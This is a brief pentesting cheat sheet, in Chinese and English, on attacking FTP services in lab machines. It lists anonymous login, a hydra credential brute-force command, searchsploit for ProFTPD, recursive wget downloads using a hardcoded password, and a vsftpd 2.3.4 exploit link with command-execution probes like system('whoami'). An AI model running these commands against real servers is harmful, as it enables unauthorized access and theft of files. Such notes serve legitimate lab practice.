FTP 文件传输协议 , 控制连接默认端口


**Anonymoys Login

```bash
ftp 192.168.0.100
> Anonymous
> 
```

**简单凭据爆破**
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.218.46
```

**ProFTPD Version Exploit**
> [0x06 Digitalworld.local (JOY) WP](../../0X0A%20vulhub%20WP/第二组推荐靶机%20Linux/0x06%20Digitalworld.local%20(JOY)%20WP.md)
```bash
searchsploit proftpd [-m]
```

**多文件下载 (下载至本地)**
```
wget -r 'ftp://ftp_user:UTDRSCH53c"$6hys@10.129.1.183's
wget -m ftp://Username:Password@IP
```

**vsftpd2.3.4 exp**
https://github.com/Hellsender01/vsftpd_2.3.4_Exploits
```
get_current_user()
system("whoami");
scandir("/home/")
file_get_contents('/home/')
```